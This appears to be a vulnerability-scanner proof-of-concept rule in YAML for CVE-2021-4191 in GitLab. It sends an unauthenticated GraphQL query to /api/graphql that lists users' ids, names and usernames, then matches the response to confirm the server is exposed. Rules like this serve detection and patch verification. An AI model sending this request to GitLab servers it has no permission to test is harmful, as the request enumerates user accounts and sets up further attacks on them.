name: poc-yaml-gitlab-graphql-cve-2021-4191-unauth-info-leak
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/graphql
            headers:
                Content-Type: application/json
            body: '{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("{\"data\":{\"") && response.body_string.contains("\"nodes\":[{\"") && response.content_type.contains("application/json") && response.body_string.contains("gid://")
expression: r0()
detail:
    author: Â∞èz
    links:
        - https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/
        - https://gitlab.com/gitlab-org/gitlab/-/issues/343898
    vulnerability:
        level: medium